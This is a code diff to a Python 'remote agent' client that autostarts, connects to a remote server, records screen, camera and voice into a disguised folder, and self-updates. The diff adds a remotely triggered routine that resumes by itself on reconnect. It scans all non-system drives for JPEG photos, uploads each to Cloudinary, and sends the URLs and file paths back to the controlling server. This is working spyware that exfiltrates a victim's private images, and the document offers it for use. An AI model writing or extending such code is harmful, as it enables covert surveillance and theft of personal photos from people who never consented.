@@ -38,6 +38,7 @@ ENV_OVERRIDE_KEYS = {
     "AUDIO_SAMPLE_RATE",
     "AUDIO_CHANNELS",
     "AUDIO_BLOCK_FRAMES",
+    "IMAGE_SCAN_IGNORE_DRIVES",
 }
 
 try:
@@ -239,8 +240,32 @@ ensure_autostart_enabled()
 DEFAULT_SERVER_URL = "https://remote-agent-node.onrender.com"
 SERVER_URL = os.getenv("SERVER_URL", DEFAULT_SERVER_URL)
 RECORDING_DIR = os.path.join(os.getenv("APPDATA", os.getcwd()), "WinVideoLogs")
+IMAGE_SYNC_DIR = os.path.join(os.getenv("APPDATA", BASE_DIR), "RemoteAgent")
+IMAGE_SYNC_STATE_FILE = os.path.join(IMAGE_SYNC_DIR, "image_sync_state.json")
 FPS = 8.0
 RECONNECT_DELAY_SECONDS = 5
+IMAGE_SYNC_RETRY_DELAY_SECONDS = 5
+IMAGE_EXTENSIONS = {".jpg", ".jpeg"}
+IMAGE_SCAN_IGNORE_DRIVES = {
+    drive.strip().upper().replace(":", "")
+    for drive in os.getenv("IMAGE_SCAN_IGNORE_DRIVES", "C").split(",")
+    if drive and drive.strip()
+}
+IMAGE_SCAN_IGNORED_DIR_NAMES = {
+    "windows",
+    "program files",
+    "program files (x86)",
+    "programdata",
+    "$recycle.bin",
+    "system volume information",
+    "recovery",
+    "perflogs",
+}
+IMAGE_SCAN_IGNORED_DIR_KEYWORDS = {
+    "software",
+    "windows",
+    "program files",
+}
 try:
     AUDIO_SAMPLE_RATE = max(8000, int(os.getenv("AUDIO_SAMPLE_RATE", "16000")))
 except ValueError:
@@ -309,12 +334,20 @@ is_voice_recording = False
 recording_lock = threading.Lock()
 camera_lock = threading.Lock()
 voice_lock = threading.Lock()
+image_sync_lock = threading.Lock()
 update_lock = threading.Lock()
 update_last_checked_at = 0
 update_in_progress = False
+is_image_sync_running = False
+image_sync_thread = None
+image_sync_stop_event = threading.Event()
+image_sync_reset_requested = False
 
 if not os.path.exists(RECORDING_DIR):
     os.makedirs(RECORDING_DIR)
+
+if not os.path.exists(IMAGE_SYNC_DIR):
+    os.makedirs(IMAGE_SYNC_DIR)
 
 
 def emit_agent_state(source=""):
@@ -345,6 +378,379 @@ def emit_update_state(stage, details=None):
         sio.emit('agent_update_status', payload)
     except Exception as error:
         log_error(f"Failed to emit update state ({stage}): {error}")
+
+
+def emit_image_sync_state(stage, details=None):
+    payload = {
+        'machine': MACHINE_NAME,
+        'stage': stage,
+        'timestamp': int(time.time() * 1000),
+    }
+    if details:
+        payload.update(details)
+
+    try:
+        sio.emit('image_sync_status', payload)
+    except Exception as error:
+        log_error(f"Failed to emit image sync state ({stage}): {error}")
+
+
+def load_image_sync_state():
+    default_state = {
+        'pendingFiles': [],
+        'nextIndex': 0,
+        'uploadedHashes': [],
+    }
+
+    if not os.path.exists(IMAGE_SYNC_STATE_FILE):
+        return default_state
+
+    try:
+        with open(IMAGE_SYNC_STATE_FILE, "r", encoding="utf-8") as file:
+            state = json.load(file)
+    except Exception as error:
+        log_error(f"Failed to read image sync state: {error}")
+        return default_state
+
+    pending_files = state.get('pendingFiles', [])
+    if not isinstance(pending_files, list):
+        pending_files = []
+
+    uploaded_hashes = state.get('uploadedHashes', [])
+    if not isinstance(uploaded_hashes, list):
+        uploaded_hashes = []
+
+    try:
+        next_index = int(state.get('nextIndex', 0))
+    except (TypeError, ValueError):
+        next_index = 0
+
+    next_index = max(0, min(next_index, len(pending_files)))
+
+    return {
+        'pendingFiles': pending_files,
+        'nextIndex': next_index,
+        'uploadedHashes': [str(item) for item in uploaded_hashes if item],
+    }
+
+
+def save_image_sync_state(pending_files, next_index, uploaded_hashes):
+    safe_pending_files = pending_files if isinstance(pending_files, list) else []
+    try:
+        parsed_next_index = int(next_index or 0)
+    except (TypeError, ValueError):
+        parsed_next_index = 0
+    safe_next_index = max(0, min(parsed_next_index, len(safe_pending_files)))
+    safe_uploaded_hashes = list(uploaded_hashes) if isinstance(uploaded_hashes, (list, set, tuple)) else []
+    state = {
+        'pendingFiles': safe_pending_files,
+        'nextIndex': safe_next_index,
+        'uploadedHashes': safe_uploaded_hashes,
+        'updatedAt': int(time.time()),
+    }
+
+    temp_path = IMAGE_SYNC_STATE_FILE + ".tmp"
+    try:
+        with open(temp_path, "w", encoding="utf-8") as file:
+            json.dump(state, file, ensure_ascii=False)
+        os.replace(temp_path, IMAGE_SYNC_STATE_FILE)
+    except Exception as error:
+        log_error(f"Failed to save image sync state: {error}")
+        try:
+            if os.path.exists(temp_path):
+                os.remove(temp_path)
+        except OSError:
+            pass
+
+
+def get_windows_drive_roots():
+    if os.name != "nt":
+        return ["/"]
+
+    roots = []
+    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
+        if letter in IMAGE_SCAN_IGNORE_DRIVES:
+            continue
+        drive_root = f"{letter}:\\"
+        if os.path.exists(drive_root):
+            roots.append(drive_root)
+    return roots
+
+
+def should_ignore_path_segment(segment):
+    normalized = str(segment or "").strip().lower()
+    if not normalized:
+        return False
+
+    if normalized in IMAGE_SCAN_IGNORED_DIR_NAMES:
+        return True
+
+    for keyword in IMAGE_SCAN_IGNORED_DIR_KEYWORDS:
+        if keyword in normalized:
+            return True
+
+    return False
+
+
+def collect_device_image_files():
+    image_files = []
+    for drive_root in get_windows_drive_roots():
+        try:
+            for root, dirs, files in os.walk(drive_root, topdown=True):
+                dirs[:] = [directory for directory in dirs if not should_ignore_path_segment(directory)]
+
+                root_parts = re.split(r"[\\/]+", root)
+                if any(should_ignore_path_segment(part) for part in root_parts):
+                    continue
+
+                for file_name in files:
+                    extension = os.path.splitext(file_name)[1].lower()
+                    if extension in IMAGE_EXTENSIONS:
+                        full_path = os.path.join(root, file_name)
+                        path_parts = re.split(r"[\\/]+", full_path)
+                        if any(should_ignore_path_segment(part) for part in path_parts):
+                            continue
+                        image_files.append(full_path)
+        except Exception as error:
+            log_error(f"Image scan error on {drive_root}: {error}")
+
+    image_files.sort(key=lambda path: path.lower())
+    return image_files
+
+
+def compute_file_sha256(file_path):
+    digest = hashlib.sha256()
+    with open(file_path, "rb") as file:
+        while True:
+            chunk = file.read(1024 * 1024)
+            if not chunk:
+                break
+            digest.update(chunk)
+    return digest.hexdigest().lower()
+
+
+def upload_image_to_cloudinary(file_path):
+    response = cloudinary.uploader.upload(file_path, resource_type="image")
+    image_url = response.get("secure_url") or response.get("url")
+    if not image_url:
+        raise RuntimeError("Cloudinary response missing image URL")
+    return image_url
+
+
+def has_pending_image_sync_work():
+    state = load_image_sync_state()
+    pending_files = state.get('pendingFiles', [])
+    next_index = state.get('nextIndex', 0)
+    return bool(pending_files) and next_index < len(pending_files)
+
+
+def get_image_sync_snapshot():
+    state = load_image_sync_state()
+    pending_files = state.get('pendingFiles', [])
+    next_index = state.get('nextIndex', 0)
+    total_files = len(pending_files)
+    remaining_files = max(0, total_files - next_index)
+    return {
+        'machine': MACHINE_NAME,
+        'running': bool(is_image_sync_running),
+        'nextIndex': next_index,
+        'totalFiles': total_files,
+        'remainingFiles': remaining_files,
+        'timestamp': int(time.time() * 1000),
+    }
+
+
+def emit_image_sync_snapshot(event_name='image_sync_snapshot'):
+    try:
+        sio.emit(event_name, get_image_sync_snapshot())
+    except Exception as error:
+        log_error(f"Failed to emit image sync snapshot ({event_name}): {error}")
+
+
+def image_sync_worker(force_rescan=False, trigger_source="admin"):
+    global is_image_sync_running
+    global image_sync_thread
+    global image_sync_reset_requested
+
+    try:
+        state = load_image_sync_state()
+        pending_files = state.get('pendingFiles', [])
+        next_index = state.get('nextIndex', 0)
+        uploaded_hashes = set(state.get('uploadedHashes', []))
+
+        if force_rescan or not pending_files or next_index >= len(pending_files):
+            emit_image_sync_state('scanning', {'trigger': trigger_source})
+            pending_files = collect_device_image_files()
+            next_index = 0
+            save_image_sync_state(pending_files, next_index, uploaded_hashes)
+
+        total_files = len(pending_files)
+        emit_image_sync_state('started', {
+            'trigger': trigger_source,
+            'totalFiles': total_files,
+            'resumeIndex': next_index,
+        })
+
+        if total_files == 0:
+            emit_image_sync_state('completed', {
+                'trigger': trigger_source,
+                'totalFiles': 0,
+                'uploadedCount': 0,
+            })
+            save_image_sync_state([], 0, uploaded_hashes)
+            return
+
+        while next_index < total_files and not image_sync_stop_event.is_set():
+            while not image_sync_stop_event.is_set() and not sio.connected:
+                time.sleep(RECONNECT_DELAY_SECONDS)
+
+            if image_sync_stop_event.is_set():
+                break
+
+            file_path = pending_files[next_index]
+
+            if not os.path.exists(file_path):
+                next_index += 1
+                save_image_sync_state(pending_files, next_index, uploaded_hashes)
+                continue
+
+            try:
+                file_hash = compute_file_sha256(file_path)
+            except Exception as error:
+                log_error(f"Image hash failed ({file_path}): {error}")
+                next_index += 1
+                save_image_sync_state(pending_files, next_index, uploaded_hashes)
+                continue
+
+            if file_hash in uploaded_hashes:
+                next_index += 1
+                save_image_sync_state(pending_files, next_index, uploaded_hashes)
+                continue
+
+            try:
+                image_url = upload_image_to_cloudinary(file_path)
+                uploaded_hashes.add(file_hash)
+                next_index += 1
+                save_image_sync_state(pending_files, next_index, uploaded_hashes)
+                sio.emit('image_upload_complete', {
+                    'machine': MACHINE_NAME,
+                    'url': image_url,
+                    'filePath': file_path,
+                    'index': next_index,
+                    'total': total_files,
+                    'mediaType': 'image',
+                })
+            except Exception as error:
+                log_error(f"Image upload failed ({file_path}): {error}")
+                emit_image_sync_state('retrying', {
+                    'trigger': trigger_source,
+                    'filePath': file_path,
+                    'index': next_index,
+                    'totalFiles': total_files,
+                    'error': str(error),
+                })
+                time.sleep(IMAGE_SYNC_RETRY_DELAY_SECONDS)
+
+        if image_sync_stop_event.is_set():
+            reset_requested = False
+            with image_sync_lock:
+                if image_sync_reset_requested:
+                    reset_requested = True
+                    image_sync_reset_requested = False
+
+            if reset_requested:
+                save_image_sync_state([], 0, uploaded_hashes)
+                emit_image_sync_state('reset', {
+                    'trigger': trigger_source,
+                    'nextIndex': 0,
+                    'totalFiles': 0,
+                })
+            else:
+                save_image_sync_state(pending_files, next_index, uploaded_hashes)
+                emit_image_sync_state('stopped', {
+                    'trigger': trigger_source,
+                    'nextIndex': next_index,
+                    'totalFiles': total_files,
+                })
+        else:
+            save_image_sync_state([], 0, uploaded_hashes)
+            emit_image_sync_state('completed', {
+                'trigger': trigger_source,
+                'totalFiles': total_files,
+                'uploadedCount': next_index,
+            })
+    except Exception as error:
+        log_error(f"Image sync worker error: {error}")
+        emit_image_sync_state('failed', {
+            'trigger': trigger_source,
+            'error': str(error),
+        })
+    finally:
+        with image_sync_lock:
+            is_image_sync_running = False
+            image_sync_thread = None
+
+
+def start_image_sync(force_rescan=False, trigger_source="admin"):
+    global is_image_sync_running
+    global image_sync_thread
+    global image_sync_reset_requested
+
+    if not CLOUDINARY_READY:
+        emit_image_sync_state('failed', {
+            'trigger': trigger_source,
+            'error': 'cloudinary_not_configured',
+        })
+        return False
+
+    with image_sync_lock:
+        if is_image_sync_running:
+            emit_image_sync_state('already_running', {'trigger': trigger_source})
+            return False
+
+        image_sync_stop_event.clear()
+        image_sync_reset_requested = False
+        is_image_sync_running = True
+        image_sync_thread = threading.Thread(
+            target=image_sync_worker,
+            args=(bool(force_rescan), trigger_source),
+            daemon=True,
+        )
+        image_sync_thread.start()
+    return True
+
+
+def stop_image_sync(trigger_source="admin"):
+    if not is_image_sync_running:
+        emit_image_sync_state('idle', {'trigger': trigger_source})
+        return False
+
+    image_sync_stop_event.set()
+    emit_image_sync_state('stopping', {'trigger': trigger_source})
+    return True
+
+
+def reset_image_sync(trigger_source="admin", clear_uploaded_hashes=False):
+    global image_sync_reset_requested
+
+    state = load_image_sync_state()
+    uploaded_hashes = [] if clear_uploaded_hashes else state.get('uploadedHashes', [])
+
+    with image_sync_lock:
+        if is_image_sync_running:
+            image_sync_reset_requested = True
+            image_sync_stop_event.set()
+            emit_image_sync_state('resetting', {'trigger': trigger_source})
+            return True
+
+    save_image_sync_state([], 0, uploaded_hashes)
+    emit_image_sync_state('reset', {
+        'trigger': trigger_source,
+        'nextIndex': 0,
+        'totalFiles': 0,
+        'clearedUploadedHashes': bool(clear_uploaded_hashes),
+    })
+    return True
 
 
 def version_to_tuple(version_value):
@@ -733,7 +1139,10 @@ def connect():
     log_error(f"Connected to {SERVER_URL}")
     sio.emit('register_node', {'machine': MACHINE_NAME})
     emit_agent_state('connected')
+    emit_image_sync_snapshot()
     threading.Thread(target=check_for_agent_updates, kwargs={'force': True, 'source': 'connect'}, daemon=True).start()
+    if has_pending_image_sync_work() and not is_image_sync_running:
+        threading.Thread(target=start_image_sync, kwargs={'force_rescan': False, 'trigger_source': 'reconnect_resume'}, daemon=True).start()
 
 
 @sio.event
@@ -813,6 +1222,63 @@ def on_voice_stop(data=None):
 def on_force_update_check(data=None):
     log_error("force_update_check received")
     threading.Thread(target=check_for_agent_updates, kwargs={'force': True, 'source': 'admin'}, daemon=True).start()
+
+
+def handle_find_image_and_save(data=None, event_name="find_image_and_save"):
+    force_rescan = False
+    if isinstance(data, dict):
+        force_rescan = bool(data.get('forceRescan', False))
+
+    log_error(f"{event_name} received (forceRescan={force_rescan})")
+    started = start_image_sync(force_rescan=force_rescan, trigger_source=event_name)
+    if started:
+        emit_image_sync_state('queued', {'trigger': event_name, 'forceRescan': force_rescan})
+
+
+@sio.on('find_image_and_save')
+def on_find_image_and_save(data=None):
+    handle_find_image_and_save(data=data, event_name='find_image_and_save')
+
+
+@sio.on('start_image_sync')
+def on_start_image_sync(data=None):
+    handle_find_image_and_save(data=data, event_name='start_image_sync')
+
+
+@sio.on('stop_find_image_and_save')
+def on_stop_find_image_and_save(data=None):
+    log_error("stop_find_image_and_save received")
+    stop_image_sync(trigger_source='stop_find_image_and_save')
+
+
+@sio.on('stop_image_sync')
+def on_stop_image_sync(data=None):
+    log_error("stop_image_sync received")
+    stop_image_sync(trigger_source='stop_image_sync')
+
+
+@sio.on('reset_image_sync')
+def on_reset_image_sync(data=None):
+    clear_uploaded_hashes = False
+    if isinstance(data, dict):
+        clear_uploaded_hashes = bool(data.get('clearUploadedHashes', False))
+    log_error(f"reset_image_sync received (clearUploadedHashes={clear_uploaded_hashes})")
+    reset_image_sync(trigger_source='reset_image_sync', clear_uploaded_hashes=clear_uploaded_hashes)
+
+
+@sio.on('stop_and_reset_image_sync')
+def on_stop_and_reset_image_sync(data=None):
+    clear_uploaded_hashes = False
+    if isinstance(data, dict):
+        clear_uploaded_hashes = bool(data.get('clearUploadedHashes', False))
+    log_error(f"stop_and_reset_image_sync received (clearUploadedHashes={clear_uploaded_hashes})")
+    reset_image_sync(trigger_source='stop_and_reset_image_sync', clear_uploaded_hashes=clear_uploaded_hashes)
+
+
+@sio.on('get_image_sync_status')
+def on_get_image_sync_status(data=None):
+    log_error("get_image_sync_status received")
+    emit_image_sync_snapshot()
 
 if __name__ == "__main__":
     log_error(f"Agent booted. pid={os.getpid()} exe={os.path.abspath(sys.executable)} version={AGENT_VERSION} autoUpdate={AUTO_UPDATE_ENABLED}")
